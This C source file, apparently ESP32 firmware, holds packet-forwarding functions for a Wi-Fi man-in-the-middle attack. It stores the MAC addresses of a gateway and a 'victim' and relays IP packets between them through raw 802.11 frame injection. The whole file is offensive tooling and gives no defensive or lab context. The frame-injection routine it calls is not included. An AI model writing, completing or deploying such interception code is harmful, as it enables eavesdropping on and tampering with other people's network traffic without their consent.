#include "forwarding.h"
#include "packet_utils.h"

extern uint8_t g_gateway_mac[6];
extern uint8_t g_victim_mac[6];
extern uint8_t g_esp32_mac[6];
extern uint8_t g_bssid[6];

void forwardToGateway(const uint8_t* ipPkt, uint16_t ipLen) {
    inject80211(g_gateway_mac, g_esp32_mac, g_bssid, LLC_SNAP_IP, ipPkt, ipLen);
}

void forwardToVictim(const uint8_t* ipPkt, uint16_t ipLen) {
    inject80211(g_victim_mac, g_esp32_mac, g_bssid, LLC_SNAP_IP, ipPkt, ipLen);
}
